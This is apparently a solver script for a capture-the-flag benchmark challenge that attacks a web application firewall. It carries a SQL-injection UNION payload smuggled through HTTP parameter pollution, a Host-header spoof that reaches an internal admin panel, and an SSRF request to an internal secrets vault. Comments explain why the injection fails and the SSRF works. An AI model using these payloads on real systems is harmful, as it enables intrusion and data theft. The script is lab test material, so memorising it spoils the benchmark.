#!/usr/bin/env bash
# APEX-049-25 — "WAF Gauntlet" (tags: waf_bypass, sqli, hpp, host_header, ssrf)
#
# Two things, and it is worth saying which one produces the flag.
#
# The WAF is genuinely bypassable. It inspects only the *first* value of a
# repeated query parameter — `val[1]` in its Lua, marked as the vulnerability in
# its own source — so `?q=safe&q=<payload>` is a request it passes and would
# otherwise answer with a 403. Demonstrating that needs `--raw-target`, because
# `--set query.q=` replaces a parameter rather than repeating it, which is
# correct behaviour and the opposite of what parameter pollution is.
#
# It does not become an injection. The application reads `request.args.get("q")`,
# which in Flask is the *first* value — the same one the WAF inspected — so the
# payload is passed and then ignored. The benchmark's own docstring says "Flask
# uses the LAST value of duplicate query parameters"; it does not, and that is
# why the intended chain stops here.
#
# The flag comes from the other half. The WAF routes by `Host`, and
# `Host: admin.internal` reaches an admin panel that asks for nothing at all;
# its health-check fetches a URL for you, and the secrets vault is on the same
# internal network. Two headers and a JSON body, no credentials involved.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex049-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api/search?q=safe" --session "$SESSION" --new --capture >/dev/null

# Blocked when it is the only value, passed when it is the second: the same
# payload, and the WAF's answer decided by where it sits.
PAYLOAD="' UNION SELECT id,email,password_hash,role FROM users--"
BLOCKED="$(python3 -c '
import sys, urllib.parse
print("/api/search?q=" + urllib.parse.quote(sys.argv[1], safe=""))' "$PAYLOAD")"
POLLUTED="$(python3 -c '
import sys, urllib.parse
print("/api/search?q=safe&q=" + urllib.parse.quote(sys.argv[1], safe=""))' "$PAYLOAD")"

for target in "$BLOCKED" "$POLLUTED"; do
    send "$SESSION" req_0 --raw-target "$target" |
        python3 -c '
import re, sys
head = sys.stdin.read().splitlines()[0]
print("the WAF answered", re.search(r"\d{3}", head).group(0), file=sys.stderr)
'
done

# And the door that is not locked at all.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/health-check \
    --set header.Host=admin.internal \
    --set header.Content-Type=application/json \
    --set 'json.url=http://secrets-vault:5001/flag' | flag
